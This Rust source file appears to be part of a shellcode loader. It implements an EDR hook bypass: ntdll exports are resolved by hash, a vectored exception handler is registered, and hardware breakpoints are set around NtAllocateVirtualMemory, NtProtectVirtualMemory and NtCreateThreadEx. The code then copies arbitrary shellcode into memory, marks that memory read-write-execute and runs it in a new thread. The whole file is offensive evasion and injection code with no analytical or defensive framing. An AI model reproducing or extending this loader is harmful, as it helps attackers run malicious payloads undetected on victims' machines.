use std::ffi::c_void;
use crate::api::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};
use crate::api::types::*;
use crate::syscall::common::hwbp::{set_hwbp, clear_hwbp, HWBPType, HWBPSize};
use crate::syscall::common::{env::get_loaded_module_by_hash, pe::get_export_by_hash};

mod handler;

const NTDLL_HASH: u32 = crate::dbj2_hash!(b"ntdll.dll");
const NT_ALLOC_HASH: u32 = crate::dbj2_hash!(b"NtAllocateVirtualMemory");
const NT_PROTECT_HASH: u32 = crate::dbj2_hash!(b"NtProtectVirtualMemory");
const NT_CREATE_THREAD_HASH: u32 = crate::dbj2_hash!(b"NtCreateThreadEx");
const RTL_ADD_VEH_HASH: u32 = crate::dbj2_hash!(b"RtlAddVectoredExceptionHandler");
const RTL_REMOVE_VEH_HASH: u32 = crate::dbj2_hash!(b"RtlRemoveVectoredExceptionHandler");

fn execute_with_hwbp(ntdll: *mut u8, func_hash: u32, callback: &mut dyn FnMut(*mut u8) -> i32) -> Result<(), String> {
    let func_addr = unsafe { get_export_by_hash(ntdll, func_hash) }.ok_or(format!("API {:#x} not found", func_hash))?;
    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("API {:#x} address: {:#x}", func_hash, func_addr as usize));

    let hook_addr = (func_addr as usize) + 3;
    unsafe { set_hwbp(0, hook_addr, HWBPType::Execute, HWBPSize::Byte); }
    
    let status = callback(func_addr);
    
    unsafe { clear_hwbp(0); }
    
    if status < 0 {
        return Err(format!("API {:#x} failed: {:#x}", func_hash, status));
    }
    Ok(())
}

#[cfg(feature = "run_hook_bypass")]
pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Starting Hook Bypass execution...");

    let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("ntdll base: {:#x}", ntdll as usize));

    let rtl_add_veh_addr = get_export_by_hash(ntdll, RTL_ADD_VEH_HASH).ok_or("VEH API not found")?;
    let rtl_add_veh: RtlAddVehFn = std::mem::transmute(rtl_add_veh_addr);

    let rtl_remove_veh_addr = get_export_by_hash(ntdll, RTL_REMOVE_VEH_HASH).ok_or("VEH API not found")?;
    let rtl_remove_veh: RtlRemoveVehFn = std::mem::transmute(rtl_remove_veh_addr);

    let veh_handle = rtl_add_veh(1, handler::exception_handler as *mut c_void);
    if veh_handle.is_null() {
        return Err("Failed to register VEH".to_string());
    }
    
    #[cfg(feature = "debug")]
    crate::utils::print_message("VEH registered.");

    struct VehGuard {
        handle: *mut c_void,
        remove_fn: RtlRemoveVehFn,
    }
    impl Drop for VehGuard {
        fn drop(&mut self) {
            unsafe { (self.remove_fn)(self.handle); }
            #[cfg(feature = "debug")]
            crate::utils::print_message("VEH removed.");
        }
    }
    let _veh_guard = VehGuard { handle: veh_handle, remove_fn: rtl_remove_veh };

    let mut base_addr: *mut c_void = std::ptr::null_mut();
    let mut region_size = shellcode_len;
    
    execute_with_hwbp(ntdll, NT_ALLOC_HASH, &mut |addr| {
        let nt_alloc: NtAllocateVirtualMemoryFn = std::mem::transmute(addr);
        nt_alloc(-1, &mut base_addr, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    })?;

    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Memory allocated at: {:p}", base_addr));

    std::ptr::copy_nonoverlapping(shellcode_ptr as *const u8, base_addr as *mut u8, shellcode_len);
    
    let mut old_prot = 0;
    execute_with_hwbp(ntdll, NT_PROTECT_HASH, &mut |addr| {
        let nt_protect: NtProtectVirtualMemoryFn = std::mem::transmute(addr);
        nt_protect(-1, &mut base_addr, &mut region_size, PAGE_EXECUTE_READWRITE, &mut old_prot)
    })?;
    
    #[cfg(feature = "debug")]
    crate::utils::print_message("Memory protection changed to RWX.");

    let mut thread_handle = 0;
    execute_with_hwbp(ntdll, NT_CREATE_THREAD_HASH, &mut |addr| {
        let nt_create: NtCreateThreadExFn = std::mem::transmute(addr);
        nt_create(&mut thread_handle, 0x1FFFFF, std::ptr::null_mut(), -1, base_addr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut())
    })?;
    
    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Thread created, handle: {:#x}", thread_handle));

    drop(_veh_guard);
    crate::api::wait_for_single_object(thread_handle);
    
    Ok(())
}
